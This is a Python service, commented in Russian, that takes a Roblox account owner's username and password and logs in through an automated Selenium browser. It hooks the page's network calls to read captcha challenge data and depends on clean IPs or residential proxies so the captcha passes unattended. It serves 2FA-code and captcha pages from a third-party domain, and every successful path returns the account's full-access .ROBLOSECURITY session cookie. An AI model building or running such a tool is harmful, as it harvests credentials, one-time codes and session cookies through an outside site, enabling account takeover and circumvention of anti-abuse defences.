#!/usr/bin/env python3
"""
Сервис кооперативного входа покупателя (персистентный браузер) — ядро метода свизера.

Зачем не одноразовый buyer_login.py: при капче нужно ДЕРЖАТЬ тот же браузер живым, пока покупатель
решает капчу по ссылке. PoW и сессия challenge'а живут в этом браузере — токен капчи надо «довнести»
в ТУ ЖЕ сессию (challenge/v1/continue + повтор /v2/login), иначе Roblox его не примет.

КАПЧА — PATH C (проверено живьём 2026-06-21): FunCaptcha решается ПРЯМО В ЭТОМ БРАУЗЕРЕ. Виджет Arkose
рендерит сам фронт Roblox (origin = roblox.com), и для чистого IP капча проходит прозрачно (sup=1) —
вход завершается без участия покупателя (start ждёт who_am_i). Кооперативная отдача токена покупателю
на свой домен НЕРАБОЧАЯ и больше не используется: Roblox делает Arkose API Source Validation и бракует
токен, решённый не под roblox.com (continue → 403 «internal error»). Хэндлеры /captcha оставлены
мёртвыми для совместимости; start «captcha» больше не возвращает. Грязный IP с визуальным пазлом →
start вернёт error (нужен чистый IP/резидентный прокси); платный солвер не подключаем (выбран путь C).

Поток (как swizzyer):
  1) POST /start {username,password}     → запускаем браузер, логинимся (браузер сам решает PoW),
                                            ловим исход:
        {"status":"ok","account":..,"roblosecurity":..}                  — вошли сразу (прозрачная капча)
        {"status":"captcha","sid":..,"publicKey":..,"blob":..}           — нужна капча покупателя
        {"status":"2fa","sid":..,"mediaType":..}                         — нужен код (email/authenticator)
        {"status":"2fa_push","sid":..}                                   — апрув с телефона (ждём)
        {"status":"pending","sid":..}                                    — ещё думаем, опроси /poll
  2) GET  /captcha?sid=..                 → HTML-страница покупателю с виджетом Arkose (тот же blob)
  3) POST /captcha {sid,token}            → довносим токен в браузер → {"status":"ok","roblosecurity":..}
  4) POST /2fa {sid,code}                 → вводим код → {"status":"ok",..}
  5) POST /poll {sid}                     → для push/ожидания → ok|pending
  6) POST /close {sid}                    → закрыть сессию

Запуск:  python login_service.py [--port 8765] [--headed]
Прод-связка: страницу /captcha кладёшь на свой домен (wesqaliqo.com), она проксирует токен сюда.

ВНИМАНИЕ: roblosecurity = полный доступ к аккаунту. Сервис локальный; наружу — только через бэкенд.
НЕ ПОДТВЕРЖЕНО вживую (нет аккаунта со 100% капчей): (а) принимает ли Arkose виджет на нашем домене
с publicKey Roblox+blob; (б) точная структура metadata капчи. Проверять на живой капче — см. _read_captcha.
"""

import os
import sys
import json
import time
import base64
import uuid
import threading
import tempfile
import shutil
import argparse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:  # noqa: BLE001
    pass

import buyer_login as bl  # переиспуем make_driver/submit_login/who_am_i/detect_challenge/find_first
from selenium.common.exceptions import WebDriverException
from selenium.webdriver.common.by import By

# publicKey FunCaptcha для логина Roblox (Arkose). Хост виджета — roblox-api.arkoselabs.com.
ARKOSE_PUBLIC_KEY = "476068BF-9607-4799-B53D-966BE98E2B81"
SESSION_TTL = 600  # сек жизни простаивающей сессии

# Перехватчик fetch/XHR: складывает заголовки rblx-challenge-* каждого ответа /v2/login и /challenge/*.
WRAPPER = r"""
(function(){
  if (window.__rbxHook) return; window.__rbxHook = true; window.__rbx = [];
  function rec(url, status, get){
    try { var u=(url||'')+'';
      if (u.indexOf('/v2/login')<0 && u.indexOf('/challenge/')<0) return;
      window.__rbx.push({url:u,status:status,ctype:get('rblx-challenge-type'),
        cid:get('rblx-challenge-id'),cmeta:get('rblx-challenge-metadata')});
    } catch(e){}
  }
  var of=window.fetch;
  window.fetch=function(){ return of.apply(this,arguments).then(function(r){
    try{ rec(r.url,r.status,function(h){return r.headers.get(h);}); }catch(e){} return r; }); };
  var oo=XMLHttpRequest.prototype.open, os_=XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open=function(m,u){ this.__u=u; return oo.apply(this,arguments); };
  XMLHttpRequest.prototype.send=function(){ var x=this;
    x.addEventListener('load',function(){ rec(x.__u,x.status,function(h){return x.getResponseHeader(h);}); });
    return os_.apply(this,arguments); };
})();
"""

SESSIONS = {}  # sid -> {driver, profile, username, password, status, created, captcha:{...}}
LOCK = threading.Lock()


def log(m):
    print(m, file=sys.stderr, flush=True)


def _decode_meta(b64):
    if not b64:
        return None
    try:
        return json.loads(base64.b64decode(b64 + "==").decode("utf-8", "replace"))
    except Exception:  # noqa: BLE001
        return None


def _user_brief(u):
    return {"id": u.get("id"), "name": u.get("name"), "displayName": u.get("displayName")}


def _cookie(driver):
    try:
        c = driver.get_cookie(".ROBLOSECURITY")
        return c.get("value") if c else None
    except WebDriverException:
        return None


def _new_driver(headless):
    profile = tempfile.mkdtemp(prefix="rbx-svc-")
    driver = bl.make_driver(headless, profile)
    try:
        driver.set_page_load_timeout(45)
        driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {"source": WRAPPER})
    except WebDriverException as e:
        log("CDP-инъекция не удалась: %s" % e)
    return driver, profile


def _read_captcha(driver):
    """Достать из перехваченного трафика challenge капчи: blob/unifiedCaptchaId/challengeId.
    Структура metadata НЕ подтверждена на живой капче — ориентируемся на поля, что ждёт robloxAuthClient."""
    try:
        rbx = driver.execute_script("return window.__rbx || [];")
    except WebDriverException:
        rbx = []
    for e in reversed(rbx or []):
        meta = _decode_meta(e.get("cmeta"))
        ctype = (e.get("ctype") or "").lower()
        if meta:
            blob = meta.get("dataExchangeBlob") or meta.get("blob")
            if blob or "captcha" in ctype:
                return {
                    "challengeId": e.get("cid") or meta.get("challengeId"),
                    "blob": blob,
                    "unifiedCaptchaId": meta.get("unifiedCaptchaId"),
                    "metaRaw": e.get("cmeta"),
                    "type": e.get("ctype"),
                }
    return None


def _reap():
    while True:
        time.sleep(60)
        now = time.time()
        for sid in list(SESSIONS.keys()):
            s = SESSIONS.get(sid)
            if s and now - s.get("created", now) > SESSION_TTL:
                _close(sid)


def _close(sid):
    with LOCK:
        s = SESSIONS.pop(sid, None)
    if not s:
        return
    try:
        s["driver"].quit()
    except Exception:  # noqa: BLE001
        pass
    shutil.rmtree(s.get("profile", ""), ignore_errors=True)


def start_login(username, password, headless, wait=25):
    driver, profile = _new_driver(headless)
    sid = uuid.uuid4().hex
    with LOCK:
        SESSIONS[sid] = {"driver": driver, "profile": profile, "username": username,
                         "password": password, "status": "starting", "created": time.time()}
    if not bl.submit_login(driver, username, password):
        _close(sid)
        return {"status": "error", "error": "Не нашёл форму логина."}
    deadline = time.time() + wait
    saw_captcha = False
    while time.time() < deadline:
        u = bl.who_am_i(driver)
        if u:
            ck = _cookie(driver)
            _close(sid)
            return {"status": "ok", "account": _user_brief(u), "roblosecurity": ck}
        # 2FA — единственная остановка, где реально нужен покупатель (код/апрув с телефона).
        ch, media = bl.detect_challenge(driver)
        if ch == "2fa_code":
            with LOCK:
                SESSIONS[sid]["status"] = "2fa"; SESSIONS[sid]["mediaType"] = media
            return {"status": "2fa", "sid": sid, "mediaType": media}
        if ch == "2fa_push":
            with LOCK:
                SESSIONS[sid]["status"] = "2fa_push"
            return {"status": "2fa_push", "sid": sid}
        # Path C: капчу покупателю НЕ отдаём. Виджет Arkose уже рендерит фронт Roblox в ЭТОМ
        # браузере (origin = roblox.com), и для чистого IP FunCaptcha проходит прозрачно (sup=1) —
        # вход завершается сам. Кооперативная отдача токена с чужого домена тут невозможна в
        # принципе: Roblox делает Arkose API Source Validation и бракует токен, решённый не под
        # roblox.com (проверено живьём). Поэтому просто ждём, пока браузер сам добьёт вход.
        cap = _read_captcha(driver)
        if cap and cap.get("blob"):
            saw_captcha = True
        time.sleep(2)
    # Таймаут. Если капча была, а вход не завершился — прозрачно не прошло: грязный IP/нужен прокси.
    if saw_captcha:
        _close(sid)
        return {"status": "error",
                "error": "Капча Roblox не прошла автоматически (нужен чистый IP/резидентный прокси для login_service)."}
    with LOCK:
        SESSIONS[sid]["status"] = "pending"
    return {"status": "pending", "sid": sid}


# JS: довнести токен капчи в ту же сессию (continue + повтор login), вернуть статусы.
_COMPLETE_CAPTCHA_JS = r"""
const p = arguments[0], done = arguments[arguments.length-1];
(async () => {
  const csrf = await fetch('https://auth.roblox.com/v2/logout',{method:'POST',credentials:'include'})
                 .then(r=>r.headers.get('x-csrf-token')).catch(()=>null);
  const h = {'Content-Type':'application/json'}; if (csrf) h['X-CSRF-TOKEN']=csrf;
  const cont = await fetch('https://apis.roblox.com/challenge/v1/continue',{method:'POST',credentials:'include',headers:h,
    body: JSON.stringify({challengeId:p.challengeId, challengeType:'captcha',
      challengeMetadata: JSON.stringify({unifiedCaptchaId:p.unifiedCaptchaId, captchaToken:p.token, actionType:'Login'})})})
    .then(r=>r.status).catch(e=>String(e));
  const lh = Object.assign({}, h, {'Rblx-Challenge-Id':p.challengeId,'Rblx-Challenge-Type':'captcha','Rblx-Challenge-Metadata':p.metaRaw});
  let st=0, body='';
  try {
    const r = await fetch('https://auth.roblox.com/v2/login',{method:'POST',credentials:'include',headers:lh,
      body: JSON.stringify({ctype:'Username',cvalue:p.username,password:p.password})});
    st = r.status; body = (await r.text()).slice(0,300);
  } catch(e){ body = String(e); }
  done({continue: cont, login: st, body: body});
})().catch(e=>done({error:String(e)}));
"""


def submit_captcha(sid, token):
    with LOCK:
        s = SESSIONS.get(sid)
    if not s:
        return {"status": "error", "error": "Сессия не найдена/истекла."}
    if not token:
        return {"status": "error", "error": "Пустой токен капчи."}
    driver = s["driver"]; cap = s.get("captcha") or {}
    payload = {"challengeId": cap.get("challengeId"), "unifiedCaptchaId": cap.get("unifiedCaptchaId"),
               "metaRaw": cap.get("metaRaw") or "", "token": token,
               "username": s["username"], "password": s["password"]}
    try:
        driver.set_script_timeout(40)
        res = driver.execute_async_script(_COMPLETE_CAPTCHA_JS, payload)
        log("captcha continue/login: %s" % json.dumps(res, ensure_ascii=False)[:200])
    except WebDriverException as e:
        return {"status": "error", "error": "Браузер: " + str(e)[:160]}
    # дождаться, пока сессия станет авторизованной
    for _ in range(8):
        u = bl.who_am_i(driver)
        if u:
            ck = _cookie(driver)
            _close(sid)
            return {"status": "ok", "account": _user_brief(u), "roblosecurity": ck}
        time.sleep(2)
    # возможно после капчи ещё 2FA
    ch, media = bl.detect_challenge(driver)
    if ch == "2fa_code":
        with LOCK:
            SESSIONS[sid]["status"] = "2fa"
        return {"status": "2fa", "sid": sid, "mediaType": media}
    return {"status": "pending", "sid": sid, "debug": res if isinstance(res, dict) else None}


def submit_2fa(sid, code):
    with LOCK:
        s = SESSIONS.get(sid)
    if not s:
        return {"status": "error", "error": "Сессия не найдена/истекла."}
    driver = s["driver"]
    # Ввести код в поля 2FA на странице (Roblox раскидывает по 1 цифре или одно поле).
    try:
        boxes = [e for e in driver.find_elements(By.CSS_SELECTOR, "input[type='tel'], input[inputmode='numeric'], input[maxlength='1'], input[type='text']") if e.is_displayed()]
        digits = [c for c in str(code) if c.isdigit()]
        if len(boxes) >= len(digits) and len(boxes) > 1:
            for b, d in zip(boxes, digits):
                bl.react_fill(driver, b, d)
        elif boxes:
            bl.react_fill(driver, boxes[0], "".join(digits))
        btn = bl.find_first(driver, [(By.XPATH, "//button[contains(.,'Verify') or contains(.,'Submit') or contains(.,'Подтверд') or contains(.,'Continue')]"),
                                     (By.CSS_SELECTOR, "button[type='submit']")], timeout=4)
        if btn:
            driver.execute_script("arguments[0].click();", btn)
    except WebDriverException as e:
        return {"status": "error", "error": "Браузер: " + str(e)[:160]}
    for _ in range(8):
        u = bl.who_am_i(driver)
        if u:
            ck = _cookie(driver)
            log("2FA ок: вошёл @%s (id=%s), cookie=%s" % (u.get("name"), u.get("id"), "есть" if ck else "нет"))
            _close(sid)
            return {"status": "ok", "account": _user_brief(u), "roblosecurity": ck}
        time.sleep(2)
    return {"status": "pending", "sid": sid, "error": "Код не принят или ещё обрабатывается."}


def poll(sid):
    with LOCK:
        s = SESSIONS.get(sid)
    if not s:
        return {"status": "error", "error": "Сессия не найдена/истекла."}
    u = bl.who_am_i(s["driver"])
    if u:
        ck = _cookie(s["driver"])
        _close(sid)
        return {"status": "ok", "account": _user_brief(u), "roblosecurity": ck}
    return {"status": "pending", "sid": sid}


def captcha_page(sid):
    with LOCK:
        s = SESSIONS.get(sid)
    cap = (s or {}).get("captcha") or {}
    blob = cap.get("blob") or ""
    safe_sid = "".join(c for c in (sid or "") if c.isalnum())
    return """<!doctype html><html lang="ru"><head><meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/><title>Подтверждение Roblox</title>
<style>body{{font-family:system-ui,Segoe UI,sans-serif;background:#0f1116;color:#e8eaed;display:flex;
min-height:100vh;align-items:center;justify-content:center;margin:0}}.card{{background:#1a1d24;padding:24px;
border-radius:14px;max-width:420px;width:92%}}h1{{font-size:1.1rem;margin:0 0 6px}}p{{color:#9aa0aa;font-size:.9rem}}
#ok{{color:#34d399}}#err{{color:#f87171}}</style></head><body><div class="card">
<h1>Подтвердите, что вы человек</h1><p>Решите проверку — после неё вход завершится автоматически.</p>
<div id="arkose"></div><p id="status"></p>
<script>
var BLOB={blob!r}, SID={sid!r};
function setup(enf){{enf.setConfig({{selector:'#arkose',mode:'inline',data:{{blob:BLOB}},
 onCompleted:function(r){{document.getElementById('status').innerHTML='<span id=ok>Готово, завершаем вход…</span>';
   fetch('/captcha',{{method:'POST',headers:{{'Content-Type':'application/json'}},
     body:JSON.stringify({{sid:SID,token:r.token}})}}).then(x=>x.json()).then(j=>{{
       document.getElementById('status').innerHTML = j.status==='ok'
         ? '<span id=ok>Вход выполнен. Можете закрыть страницу.</span>'
         : '<span id=err>'+(j.error||j.status)+'</span>';}});}},
 onError:function(e){{document.getElementById('status').innerHTML='<span id=err>Ошибка капчи</span>';}}}});
 enf.run();}}
</script>
<script src="https://roblox-api.arkoselabs.com/v2/{pk}/api.js" data-callback="setup" async defer></script>
</div></body></html>""".format(blob=blob, sid=safe_sid, pk=ARKOSE_PUBLIC_KEY)


_TWOFA_HTML = """<!doctype html><html lang="ru"><head><meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/><title>Подтверждение входа Roblox</title>
<style>body{font-family:system-ui,Segoe UI,sans-serif;background:#0f1116;color:#e8eaed;display:flex;
min-height:100vh;align-items:center;justify-content:center;margin:0}.card{background:#1a1d24;padding:26px;
border-radius:14px;max-width:360px;width:92%}h1{font-size:1.12rem;margin:0 0 6px}p{color:#9aa0aa;font-size:.9rem;line-height:1.4}
input{width:100%;box-sizing:border-box;padding:12px;font-size:1.3rem;letter-spacing:.3em;text-align:center;border-radius:10px;
border:1px solid #2c313c;background:#0f1116;color:#fff;margin:8px 0}button{width:100%;padding:12px;border:0;border-radius:10px;
background:#3b82f6;color:#fff;font-size:1rem;cursor:pointer;margin-top:6px}.sec{background:#2c313c}#ok{color:#34d399}#err{color:#f87171}</style>
</head><body><div class="card"><h1>Подтверждение входа Roblox</h1>
<p>Введите __HINT__. Если у вас подтверждение в приложении Roblox — одобрите вход на телефоне и нажмите «Я подтвердил».</p>
<input id="code" inputmode="numeric" autocomplete="one-time-code" maxlength="6" placeholder="6-значный код" pattern="[0-9]*"/>
<button onclick="sub()">Подтвердить</button>
<button class="sec" onclick="pl()">Я подтвердил в приложении</button>
<p id="st"></p>
<script>
var SID="__SID__";
function show(j){var e=document.getElementById('st');
 if(j.status==='ok'){e.innerHTML='<span id=ok>Готово! Вход выполнен, можете закрыть страницу.</span>';}
 else if(j.status==='pending'){e.innerHTML='Проверяем… если подтверждали в приложении — подождите пару секунд и нажмите ещё раз.';}
 else{e.innerHTML='<span id=err>'+(j.error||j.status)+'</span>';}}
function post(u,b){return fetch(u,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(b)}).then(r=>r.json()).then(show).catch(e=>show({status:'err',error:String(e)}));}
function sub(){post('/2fa',{sid:SID,code:document.getElementById('code').value});}
function pl(){post('/poll',{sid:SID});}
</script></div></body></html>"""


def twofa_page(sid):
    with LOCK:
        s = SESSIONS.get(sid)
    media = (s or {}).get("mediaType") or "authenticator"
    hint = {"email": "код из письма на почте аккаунта", "authenticator": "код из приложения-аутентификатора",
            "sms": "код из SMS"}.get(media, "6-значный код подтверждения")
    safe_sid = "".join(c for c in (sid or "") if c.isalnum())
    return _TWOFA_HTML.replace("__SID__", safe_sid).replace("__HINT__", hint)


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _json(self, code, obj):
        b = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def _html(self, code, html):
        b = html.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def _body(self):
        try:
            n = int(self.headers.get("Content-Length") or 0)
            return json.loads(self.rfile.read(n).decode("utf-8")) if n else {}
        except Exception:  # noqa: BLE001
            return {}

    def do_GET(self):
        u = urlparse(self.path)
        if u.path == "/captcha":
            sid = (parse_qs(u.query).get("sid") or [""])[0]
            return self._html(200, captcha_page(sid))
        if u.path == "/2fa":
            sid = (parse_qs(u.query).get("sid") or [""])[0]
            return self._html(200, twofa_page(sid))
        if u.path == "/health":
            return self._json(200, {"ok": True, "sessions": len(SESSIONS)})
        return self._json(404, {"error": "not found"})

    def do_POST(self):
        u = urlparse(self.path)
        b = self._body()
        try:
            if u.path == "/start":
                return self._json(200, start_login(str(b.get("username", "")).strip(), str(b.get("password", "")),
                                                   headless=HEADLESS, wait=int(b.get("wait", 25))))
            if u.path == "/captcha":
                return self._json(200, submit_captcha(b.get("sid"), b.get("token")))
            if u.path == "/2fa":
                return self._json(200, submit_2fa(b.get("sid"), b.get("code")))
            if u.path == "/poll":
                return self._json(200, poll(b.get("sid")))
            if u.path == "/close":
                _close(b.get("sid")); return self._json(200, {"status": "closed"})
        except Exception as e:  # noqa: BLE001
            return self._json(500, {"status": "error", "error": str(e)[:200]})
        return self._json(404, {"error": "not found"})


HEADLESS = False


def main():
    global HEADLESS
    ap = argparse.ArgumentParser(description="Сервис кооперативного входа покупателя Roblox.")
    ap.add_argument("--port", type=int, default=8765)
    ap.add_argument("--headless", action="store_true", help="headless (НЕ рекомендуется: Arkose детектит)")
    args = ap.parse_args()
    HEADLESS = args.headless
    threading.Thread(target=_reap, daemon=True).start()
    srv = ThreadingHTTPServer(("127.0.0.1", args.port), Handler)
    log("login_service на http://127.0.0.1:%d  (start/captcha/2fa/poll/close, GET /captcha?sid=)" % args.port)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        log("стоп")


if __name__ == "__main__":
    main()
